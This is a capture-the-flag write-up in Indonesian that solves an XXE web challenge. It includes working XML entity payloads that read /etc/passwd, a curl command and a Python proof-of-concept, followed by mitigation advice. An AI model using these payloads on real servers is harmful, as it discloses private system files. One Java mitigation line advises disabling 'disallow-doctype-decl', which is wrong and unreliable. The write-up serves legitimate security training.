# 376 - SOAP (Web Exploitation, picoCTF 2023, Medium)

## Challenge Metadata
- ID: 376 | Event: picoCTF 2023 | Author: CyLab Academy
- Category: Web Exploitation | Difficulty: Medium (2) | Points: 200
- Flag: `academy{XML_3xtern@l_3nt1t1ty_503913d8}`

## Problem Statement & Scope
Tantangan menyajikan sebuah portal web profil perusahaan dengan fitur inspeksi detail item yang berinteraksi dengan API backend via endpoint `/data` menggunakan format XML. Deskripsi skenario mengarahkan peserta untuk membaca berkas rahasia sistem `/etc/passwd`.

## Teori & Akar Kerentanan (Root Cause)
1. **XML External Entity (XXE) Injection:**
   Aplikasi menerima dokumen XML melalui method `POST /data` dengan header `Content-Type: application/xml`. Parser XML backend (seperti lxml/libxml2 atau parser Python/PHP/Java default) dikonfigurasi secara tidak aman dengan fitur parsing DTD (*Document Type Definition*) eksternal tetap aktif (`resolve_entities=True` atau `libxml_disable_entity_loader(false)`).
2. **Arbitrary File Disclosure via SYSTEM Entity:**
   Dengan mendeklarasikan entitas kustom eksternal:
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   ```
   dan mereferensikannya dalam tag nilai data yang dievaluasi server (`<ID>&xxe;</ID>`), parser XML membaca konten file lokal server dan memasukkannya ke dalam alur pemrosesan.
3. **Penyimpanan Flag pada Akun Pengguna Linux:**
   Aplikasi backend mencetak hasil kesalahan pencarian atau nilai ID ke dalam output HTTP response ("Invalid ID: <konten>"). Berkas `/etc/passwd` memuat baris entri pengguna sistem `academy:x:1001:academy{XML_3xtern@l_3nt1t1ty_503913d8}`, sehingga flag terekspos secara penuh.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Interaksi Klien:**
   Skrip JavaScript `xmlDetailsCheckPayload.js` mengirimkan payload standar:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <data><ID>1</ID></data>
   ```
2. **Penyusunan Exploit Payload XXE:**
   Menyisipkan blok DTD dengan entitas sistem `file:///etc/passwd`:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE data [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data><ID>&xxe;</ID></data>
   ```
3. **Pengiriman Permintaan HTTP POST:**
   Mengirimkan payload melalui `curl` atau Python `urllib`:
   ```bash
   curl -X POST http://xebec.cylabacademy.net:<port>/data \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'
   ```
   Respons server mengembalikan seluruh isi file `/etc/passwd`, membocorkan flag `academy{XML_3xtern@l_3nt1t1ty_503913d8}`.

## Script Reproduksi & PoC
Implementasi otomasi Python lengkap tersedia pada `scripts/solve_376_soap.py`:
```python
import urllib.request, re

PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>"""

req = urllib.request.Request(
    "http://xebec.cylabacademy.net:27239/data",
    data=PAYLOAD.encode(),
    headers={"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0"}
)
with urllib.request.urlopen(req, timeout=20) as resp:
    print(resp.read().decode())
```

## Mitigasi Defensif & Relevansi LKS Cyber Security
1. **Nonaktifkan Resolusi DTD Eksternal:**
   Konfigurasikan parser XML secara aman untuk menolak entitas kustom dan skema eksternal:
   - Python `defusedxml`: Selalu gunakan library `defusedxml.ElementTree` alih-alih `xml.etree.ElementTree`.
   - Java: Set `XMLConstants.FEATURE_SECURE_PROCESSING = true` dan nonaktifkan `http://apache.org/xml/features/disallow-doctype-decl`.
   - PHP: Jalankan `libxml_disable_entity_loader(true)`.
2. **Migrasi ke Format Data Modern:**
   Ganti format pertukaran data XML dengan JSON (`application/json`) jika fungsionalitas kompleks XML schema tidak mutlak dibutuhkan.
3. **Relevansi Modul LKS:**
   Tantangan ini mencerminkan kompetensi Web Security Testing LKS mengenai eksploitasi XML parsers, file disclosure, dan sanitasi input semi-structured data.
